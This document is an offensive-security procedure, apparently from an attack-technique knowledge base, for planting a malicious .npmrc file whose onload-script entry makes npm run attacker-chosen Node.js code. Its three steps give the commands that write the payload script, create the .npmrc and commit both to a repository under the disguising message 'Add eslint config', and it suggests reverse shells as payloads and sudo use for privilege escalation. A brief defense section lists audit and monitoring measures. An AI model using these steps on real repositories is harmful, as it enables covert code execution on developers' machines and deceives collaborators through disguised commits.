---
tags:
  - npm
  - onload-script
  - configuration-manipulation
type: procedure
tools:
  - '[[tools/npm]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:28:44.418Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: da623dc3-5abf-4c28-a38c-4f23e72aa18b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Create-Malicious-npmrc-File

## Summary

This procedure creates a malicious .npmrc file that includes an onload-script entry pointing to arbitrary Node.js code, enabling execution when npm is run in the directory.

## Description

The attack exploits npm's processing of .npmrc files in the current or ancestor directories. By placing a .npmrc with an onload-script, attackers can execute Node.js scripts with the privileges of the npm process. This is particularly dangerous in shared repositories or via low-privilege writes to user configs. The vulnerability stems from line 236 in lib/npm.js where the script is loaded without safeguards, especially under sudo.

## Requirements

1. Write access to the target directory (e.g., git repo or $HOME)
2. Node.js environment to host the malicious script
3. npm versions 3.10 to 6.0

## Defense

Defensive measures and detection strategies:

- Audit .npmrc files in repositories and home directories for onload-script entries
- Use npm config to ignore user-level .npmrc or run in isolated environments
- Monitor for unexpected Node.js script executions during npm runs

## Objectives

1. Position malicious configuration for automatic loading
2. Enable arbitrary code execution on npm invocation
3. Facilitate privilege escalation if sudo is used

## Instructions

### Step 1: Prepare Malicious Script

**Context**: Create a Node.js script that performs the desired payload, such as spawning a reverse shell or writing files.

**Command** (Custom Node.js script):
```bash
echo 'const { exec } = require("child_process"); exec("id > /tmp/pwned.txt");' > malicious.js
```

> This creates a simple script that runs `id` and writes output to /tmp/pwned.txt. Expected output: File created upon execution.

### Step 2: Create .npmrc File

**Context**: Write the .npmrc with onload-script pointing to the malicious script.

**Command** (Echo to file):
```bash
echo 'onload-script=malicious.js' > .npmrc
```

> Places the .npmrc in the current directory. Expected output: .npmrc file with the entry. Verify with `cat .npmrc`.

### Step 3: Position in Target Directory

**Context**: Move or commit the files to a location the victim will use, like a git repo.

**Command** (Git example):
```bash
git add .npmrc malicious.js && git commit -m "Add eslint config"
```

> Commits the files disguised as config. Expected output: Files in repo.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/npm]]

## Tags

- [[tools/npm]]
- [[onload-script]]
- [[rce]]
